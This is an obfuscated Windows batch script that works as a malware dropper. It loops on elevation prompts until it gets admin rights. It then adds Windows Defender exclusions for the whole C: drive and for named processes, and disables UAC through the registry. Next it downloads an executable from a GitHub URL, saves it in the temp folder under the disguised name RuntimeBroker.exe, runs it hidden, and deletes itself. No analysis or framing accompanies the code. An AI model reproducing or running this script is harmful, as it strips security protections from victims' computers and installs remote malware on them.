@echo off & setlocal enableDelayedExpansion
set "VVG=>nul" & set "kps=2>&1" & set "MzaFn=SESSION" & set "GiHTA=NET"
%GiHTA% %MzaFn% %VVG% %kps%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "TAst=baz" & set "hNNI=bar" & set "oSpD=qux" & set "qizZ=foo" & rem yIuRykf tavgb pAHPi
set "LMRpj=powershell -ExecutionPolicy Bypass -Command"
set "IPSln=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "rDcfE='C:\' -ErrorAction SilentlyContinue"
!LMRpj! "!IPSln! !rDcfE!" %VVG% %kps%
set "nsoN=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
!LMRpj! "!nsoN!" %VVG% %kps%
set "WyrDh=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!LMRpj! "!WyrDh!" %VVG% %kps%
set "hhKK=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "TVHlV=-Name 'EnableLUA' -Value 0"
!LMRpj! "!hhKK! !TVHlV!" %VVG% %kps%
set "nWl=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!LMRpj! "!nWl!" %VVG% %kps%
if !errorlevel! neq 0 (goto %a%)
set "deMB=timeout /t" & !deMB! 2 %VVG% %kps%
set "Glp=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "pwJV=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!LMRpj! "!Glp! !pwJV!" %VVG% %kps%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!deMB! 1 %VVG% %kps% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %VVG% %kps%
del /f /q "%~f0" %VVG% %kps%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %VVG% %kps%
if !errorlevel! neq 0 (!deMB! 3 %VVG% %kps% & goto %b%)
exit /b
